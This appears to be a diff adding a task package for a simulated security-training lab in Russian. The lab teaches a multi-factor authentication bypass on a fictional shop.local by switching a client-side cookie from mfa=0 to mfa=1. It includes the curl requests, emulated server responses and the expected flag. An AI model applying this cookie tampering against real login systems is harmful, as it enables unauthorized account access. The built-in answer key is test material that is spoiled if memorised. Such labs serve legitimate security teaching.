@@ -1,0 +1,42 @@
+{
+  "id": "web-auth-bypass",
+  "workdir": "/home/student/task",
+  "hostname": "lab",
+  "expect": {
+    "file": "/home/student/task/found.txt",
+    "contains": "nto{mf4_st4t3_c00k13_t4mp3r3d}"
+  },
+  "fs": [
+    {
+      "path": "/home/student/task",
+      "type": "dir"
+    },
+    {
+      "path": "/home/student/task/task.md",
+      "text": "# Практика: обход MFA (подделка клиентского состояния)\n\nВход на `shop.local` двухшаговый. После пароля сервер ставит cookie\n`mfa=0`, а проверку второго шага делает по ЭТОЙ cookie — то есть доверяет\nклиенту. Переключи её в `mfa=1`.\n\n1. Первый шаг — пароль:\n   curl -s -i -c c.txt -d 'user=alice&pass=alice123' https://shop.local/login\n   (в ответе `Set-Cookie: session=8f2a11c0; mfa=0` и `\"mfa_required\":true`)\n2. Обойди проверку, выставив состояние вручную:\n   curl -s 'https://shop.local/login/mfa/complete' -b 'session=8f2a11c0; mfa=1'\n3. Сервер поверит cookie и пустит — в ответе флаг.\n4. Запиши последнюю строку в `found.txt` и набери `check`.\n"
+    }
+  ],
+  "tools": {
+    "curl": {
+      "help": "curl [опции] <url> — HTTP-клиент (эмуляция shop.local/login*)",
+      "cases": [
+        {
+          "match": "mfa/complete",
+          "example": "-s 'https://shop.local/login/mfa/complete' -b 'session=8f2a11c0; mfa=1'",
+          "output": "{\"status\":\"authenticated\",\"user\":\"alice\",\"role\":\"admin\",\"note\":\"mfa state trusted from client cookie\",\"flag\":\"nto{mf4_st4t3_c00k13_t4mp3r3d}\"}\n"
+        },
+        {
+          "match": "login/mfa",
+          "example": "-s -b c.txt -d 'mfa_token=8f2a11c0&code=000000' https://shop.local/login/mfa",
+          "output": "{\"status\":\"invalid_code\"}\n"
+        },
+        {
+          "match": "login",
+          "example": "-s -i -c c.txt -d 'user=alice&pass=alice123' https://shop.local/login",
+          "output": "HTTP/1.1 200 OK\nSet-Cookie: session=8f2a11c0; Path=/; mfa=0\nContent-Type: application/json\n\n{\"status\":\"mfa_required\",\"mfa_token\":\"8f2a11c0\",\"next\":\"/login/mfa\"}\n"
+        }
+      ],
+      "fallback": "curl: в этой лабе эмулируются /login, /login/mfa и /login/mfa/complete на shop.local.\n"
+    }
+  }
+}
